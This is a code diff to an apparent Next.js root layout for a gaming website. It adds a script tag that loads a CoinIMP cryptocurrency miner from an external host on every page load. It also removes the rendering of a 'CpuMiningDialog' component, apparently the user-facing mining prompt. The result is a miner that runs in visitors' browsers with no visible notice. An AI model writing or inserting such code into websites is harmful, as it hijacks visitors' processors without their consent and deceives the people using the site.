@@ -14,8 +14,7 @@ import { AdProvider } from '@/context/AdContext';
 import { SettingsProvider } from '@/context/SettingsContext';
 import { UpdateProvider } from '@/context/UpdateContext';
 import LinkvertiseScript from '@/components/core/LinkvertiseScript';
-import { MiningProvider } from '@/context/MiningContext';
-import CpuMiningDialog from '@/components/games/CpuMiningDialog';
+import { MiningProvider } from '@/context/MiningContext'; // Import the new MiningProvider
 
 const orbitron = Orbitron({
   subsets: ['latin'],
@@ -135,6 +134,12 @@ export default function RootLayout({
           crossOrigin="anonymous"
           strategy="afterInteractive"
         />
+        {/* Corrected CoinIMP Miner SDK Script */}
+        <Script
+          src="https://www.hostingcloud.racing/YCcn.js"
+          strategy="afterInteractive"
+          id="coinimp-miner-script"
+        />
       </head>
       <body className={`${orbitron.variable} ${poppins.variable} font-sans antialiased`} suppressHydrationWarning={true}>
         <FirebaseInitializer>
@@ -147,7 +152,6 @@ export default function RootLayout({
                         <AppShell>
                           {children}
                         </AppShell>
-                        <CpuMiningDialog />
                     </FloatingChatProvider>
                   </MiningProvider>
                 </AdProvider>
